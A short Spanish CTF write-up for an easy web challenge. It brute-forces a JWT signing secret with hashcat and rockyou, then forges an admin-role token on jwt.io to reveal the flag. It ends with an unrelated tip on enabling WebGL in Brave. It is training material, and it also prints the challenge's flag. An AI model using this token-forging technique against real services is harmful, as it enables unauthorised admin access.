**Difficulty:** Easy  
**Author:** HLVM

You can't just make stuff up

### Agarramos la session de usuario normal registrado, le hacemos fuerza bruta para descubri el secret que firma

![](img/Pasted%20image%2020260822123455.png)
```java
echo -n 
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODc0MTg0MzIwODJ9.doZgQvD9FXqoyZVnPd8FG_RvSKBXvZyBhF3uLpqwqEo' > token.txt
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt

```
### Vemos que es  secret
![](img/Pasted%20image%2020260822123711.png)

### Nos dirijimosa esta herramineta web para editar la session le agregamos al rol como admin y la clave seria secret

```url
https://www.jwt.io/
```


![](img/Pasted%20image%2020260822123527.png)
### Agregar admin y secret

![](img/Pasted%20image%2020260822123821.png)

### Pegamos la session  y recargamos la web y nos dirigimos al admin


![](img/Pasted%20image%2020260822123942.png)

### Aqui vemos como muestra la flag que seria

```java
brunner{well_known_secret}
```


![](img/Pasted%20image%2020260822123233.png)


# NOTA PARA MAQUINAS VIRTUALES
### Activar WebGL desde el navegador (sin tocar VirtualBox)

1. Abre una pestaña nueva y ve a:

```
brave://settings/system
```

2. Busca la opción **"Use hardware acceleration when available"** (Usar aceleración por hardware cuando esté disponible).
3. Activa el interruptor (toggle) si está apagado.
4. Cierra y vuelve a abrir Brave completamente (no solo la pestaña — todo el navegador).
5. Verifica que funcionó yendo a:

```
brave://gpu
```

6. Busca la línea **WebGL** en "Graphics Feature Status". Si dice algo como **"Hardware accelerated"** (en verde), quedó activo. Si sigue en rojo/amarillo diciendo "Unavailable" o "Software only", significa que el problema está más abajo (a nivel de la VM o el driver), y ahí sí tocaría revisar VirtualBox/VMware.


<div align="center" style="background: linear-gradient(135deg, #0b3d5c 0%, #1a5276 50%, #2874a6 100%); border-radius: 12px; padding: 32px 20px; margin: 16px 0; box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
  <div style="font-size: 42px; margin-bottom: 8px;">🏴‍☠️</div>
  <div style="font-family: 'Courier New', monospace; font-size: 32px; font-weight: 900; letter-spacing: 6px; color: #f4f1de; text-shadow: 2px 2px 4px rgba(0,0,0,0.4);">
    SPARROW
  </div>
  <div style="font-family: 'Courier New', monospace; font-size: 13px; letter-spacing: 3px; color: #a9cce3; margin-top: 6px; text-transform: uppercase;">
    ~ notas · writeups · CTF ~
  </div>
  <div style="margin-top: 14px; font-size: 18px; opacity: 0.7;">
    〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
  </div>
</div>